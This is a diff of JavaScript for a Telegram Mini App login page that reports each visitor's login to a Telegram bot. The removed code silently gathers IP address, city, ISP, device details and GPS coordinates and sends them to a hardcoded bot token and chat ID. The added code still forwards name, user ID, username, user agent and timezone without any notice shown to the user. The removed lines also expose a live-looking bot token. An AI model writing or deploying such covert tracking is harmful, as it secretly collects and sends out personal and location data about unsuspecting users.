@@ -1,76 +1,77 @@
 
-// ==========================
-// PUT YOUR TOKEN & CHAT ID
-// ==========================
+// ===============================
+// CONFIG - PUT YOUR DATA HERE
+// ===============================
 
-const BOT_TOKEN = "AAH1GyhzfRBnAVys0fPS9qIyB5kcilW9W00";
-const CHAT_ID   = "660086073";
+const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
+const CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE";
 
-async function getIPInfo(){
-  try{
-    const res = await fetch("https://ipapi.co/json/");
-    return await res.json();
-  }catch(e){
-    return {};
+function saveSession(user){
+  localStorage.setItem("tg_session", JSON.stringify({
+    id: user.id,
+    first_name: user.first_name,
+    username: user.username,
+    login_time: Date.now()
+  }));
+}
+
+function getSession(){
+  return JSON.parse(localStorage.getItem("tg_session"));
+}
+
+function clearSession(){
+  localStorage.removeItem("tg_session");
+}
+
+function normalizeUser(user){
+
+  const existing = getSession();
+
+  if(existing && existing.id === user.id){
+    document.getElementById("status").innerText =
+      "Session active: " + user.first_name;
+    return;
+  }
+
+  saveSession(user);
+
+  document.getElementById("status").innerText =
+    "Logged in as " + user.first_name;
+
+  sendLoginInfo(user);
+}
+
+if(window.Telegram && window.Telegram.WebApp){
+  const tg = window.Telegram.WebApp;
+  tg.ready();
+  tg.expand();
+
+  const user = tg.initDataUnsafe?.user;
+
+  if(user){
+    normalizeUser(user);
   }
 }
 
-function getDeviceInfo(){
-  return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    screen: window.screen.width + "x" + window.screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-  };
+function onTelegramAuth(user){
+  normalizeUser(user);
 }
 
-function getGPS(){
-  return new Promise(resolve=>{
-    if(!navigator.geolocation){
-      resolve(null);
-    }else{
-      navigator.geolocation.getCurrentPosition(
-        pos=>{
-          resolve({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude
-          });
-        },
-        err=>{
-          resolve(null);
-        }
-      );
-    }
-  });
-}
+async function sendLoginInfo(user){
 
-async function sendFullLoginInfo(user){
-
-  const ipData = await getIPInfo();
-  const device = getDeviceInfo();
-  const gps = await getGPS();
+  const device = navigator.userAgent;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
   let text = `
-<b>🚨 LOGIN DETECTED</b>
+<b>🚨 LOGIN</b>
 
-👤 Name: ${user.first_name || ""}
-🆔 ID: <code>${user.id}</code>
-📛 Username: @${user.username || "none"}
-🌍 Lang: ${user.language_code || ""}
+👤 ${user.first_name}
+🆔 <code>${user.id}</code>
+📛 @${user.username || "none"}
 
-🖥 Platform: ${device.platform}
-📱 Screen: ${device.screen}
-🌐 Browser: ${device.userAgent}
-🕒 Timezone: ${device.timezone}
-
-🌍 IP: ${ipData.ip || "N/A"}
-🏙 City: ${ipData.city || ""}
-🌎 Country: ${ipData.country_name || ""}
-📡 ISP: ${ipData.org || ""}
-
-📍 GPS: ${gps ? gps.lat + ", " + gps.lon : "Not allowed"}
-
-⏰ Time: ${new Date().toLocaleString()}
+🖥 ${device}
+🕒 ${timezone}
+⏰ ${new Date().toLocaleString()}
 `;
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
@@ -82,21 +83,4 @@ async function sendFullLoginInfo(user){
       parse_mode: "HTML"
     })
   });
-}
-
-if(window.Telegram && window.Telegram.WebApp){
-  const tg = window.Telegram.WebApp;
-  tg.ready();
-  tg.expand();
-
-  const user = tg.initDataUnsafe?.user;
-
-  if(user){
-    document.getElementById("status").innerText = "Logged in as " + user.first_name;
-    sendFullLoginInfo(user);
-  }else{
-    document.getElementById("status").innerText = "No Telegram user detected";
-  }
-}else{
-  document.getElementById("status").innerText = "Open inside Telegram Mini App";
 }
